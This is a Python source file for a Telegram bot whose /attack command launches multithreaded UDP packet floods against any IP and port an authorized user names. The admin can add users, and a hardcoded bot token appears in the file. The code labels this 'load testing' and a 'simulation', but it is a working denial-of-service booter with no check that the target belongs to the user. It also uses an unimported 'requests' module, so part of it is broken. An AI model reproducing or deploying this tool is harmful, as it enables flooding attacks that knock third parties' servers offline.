import telebot
import threading
import socket
import time

# Replace with your Telegram bot token
BOT_TOKEN = "8189083680:AAEaPDkep_jxUo8dcaj4TR6XgvjrVxbHAaI"
# Replace with your Telegram user ID (admin only)
ADMIN_ID = 6353114118

# Initialize the bot
bot = telebot.TeleBot(BOT_TOKEN)

# Authorized user list (starts with only the admin)
authorized_users = {ADMIN_ID}

# Store all user IDs who interacted with the bot
all_users = set()

def send_packets(ip, port, duration, threads):
    """Simulates sending packets for load testing."""
    end_time = time.time() + duration
    def send():
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            packet = b"X" * 1024  # 1KB packet
            while time.time() < end_time:
                try:
                    sock.sendto(packet, (ip, port))
                except Exception as e:
                    print(f"Error: {e}")

    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=send)
        thread_list.append(thread)
        thread.start()

    for thread in thread_list:
        thread.join()

@bot.message_handler(commands=['start'])
def start_command(message):
    all_users.add(message.from_user.id)
    bot.reply_to(
        message,
        "Welcome to the battlefield – where legends are forged. Will you rise to be the one?\n\n"
        "Commands:\n"
        "/ping <URL> - Check server status\n"
        "/attack <IP> <PORT> <DURATION> <THREADS> - Simulate traffic generation (Admin or authorized users only)\n"
        "/allow <USER_ID> - Allow another user to use restricted commands (Admin only)\n"
        "/allusers - List all users who have interacted with this bot (Admin only)"
    )

@bot.message_handler(commands=['ping'])
def ping_server(message):
    all_users.add(message.from_user.id)
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "Usage: /ping <URL>")
            return

        url = args[1]
        bot.reply_to(message, f"Pinging {url}...")
        start_time = time.time()
        response = requests.get(url, timeout=5)
        end_time = time.time()

        if response.status_code == 200:
            latency = round((end_time - start_time) * 1000, 2)
            bot.reply_to(message, f"✅ {url} is online. Latency: {latency} ms.")
        else:
            bot.reply_to(message, f"⚠️ {url} responded with status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        bot.reply_to(message, f"❌ Could not reach {url}. Error: {e}")

@bot.message_handler(commands=['attack'])
def attack_command(message):
    all_users.add(message.from_user.id)
    user_id = message.from_user.id
    if user_id not in authorized_users:
        bot.reply_to(message, "⛔ You do not have permission to use this command.")
        return

    args = message.text.split()
    if len(args) != 5:
        bot.reply_to(message, "Usage: /attack <IP> <PORT> <DURATION> <THREADS>")
        return

    try:
        ip = args[1]
        port = int(args[2])
        duration = int(args[3])
        threads = int(args[4])

        bot.reply_to(message, f"⚡ Starting attack on {ip}:{port} for {duration} seconds with {threads} threads...")
        threading.Thread(target=send_packets, args=(ip, port, duration, threads)).start()
        bot.reply_to(message, "✅ Attack simulation started. Check your server's resilience.")

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['allow'])
def allow_user(message):
    all_users.add(message.from_user.id)
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "⛔ Only the admin can use this command.")
        return

    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /allow <USER_ID>")
        return

    try:
        user_id = int(args[1])
        authorized_users.add(user_id)
        bot.reply_to(message, f"✅ User {user_id} is now authorized to use restricted commands.")
    except ValueError:
        bot.reply_to(message, "❌ Invalid USER_ID. Please provide a valid numeric user ID.")

@bot.message_handler(commands=['allusers'])
def list_all_users(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "⛔ Only the admin can use this command.")
        return

    user_list = "\n".join(str(user) for user in all_users)
    bot.reply_to(message, f"👥 All users who interacted with the bot:\n{user_list}")

print("Bot is running...")
bot.polling()
